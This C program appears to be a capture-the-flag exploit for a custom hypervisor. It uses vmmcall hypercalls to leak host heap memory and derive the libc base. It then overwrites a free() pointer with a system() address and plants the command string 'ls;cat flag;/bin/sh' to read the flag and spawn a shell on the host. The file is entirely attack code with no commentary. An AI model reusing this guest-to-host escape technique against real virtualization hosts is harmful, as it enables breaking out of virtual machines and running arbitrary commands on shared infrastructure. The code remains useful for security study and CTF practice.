/* 
 * author: TickTap
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include "utils.h"
#include <assert.h>

uint64_t virt2phys(void* p) {
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

int vmmcall(unsigned int nr, unsigned long p1, unsigned long p2, unsigned long p3, unsigned long p4) {
    int ret;

    asm volatile(
        "vmmcall"
        : "=a"(ret)
        : "a"(nr), "b"(p1), "c"(p2), "d"(p3), "S"(p4)
        : "memory"
    ); 
    return ret;
}

int lock_page_in_memory(void *address, size_t size) {
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

int main(int argc, char const* argv[]) {
    setbuf(stdout, 0);
    void *buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    lock_page_in_memory(buf, 0x1000);
    printf("%lx\n", buf);
    uint64_t buf_physaddr;
    buf_physaddr = virt2phys(buf);
    printf("%lx\n", buf_physaddr);

    vmmcall(3, 0x18, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444);
    vmmcall(2, buf_physaddr, 0x4242424242424242, 0x4343434343434343, 0x1000);
    
    uint64_t found = 0;
    for (int i = 0; i <= 0xff0; i += 0x10) {
        if (*(uint64_t *)((char *)buf+i) == 0x18) {
            found = i;
            break;
        }
    }
    if (!found) {
        die("next time");
    }
    printf("offset %lx\n", found);
    uint64_t free_addr = *(uint64_t *)((char *)buf+found+8);
    uint64_t libc_base = free_addr-0x97950;
    printf("free %llx\n", free_addr);
    printf("libc %llx\n", libc_base);
    hexdump(buf, 0x1000);
    memcpy((void *)buf, "ls;cat flag;/bin/sh\0", 20);
    *(uint64_t *)((char *)buf+found+8) = libc_base+0x4f440;
    vmmcall(1, buf_physaddr, 0x4242424242424242, 0x4343434343434343, 0x1000);
    vmmcall(4, 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444);

    return 0;
}
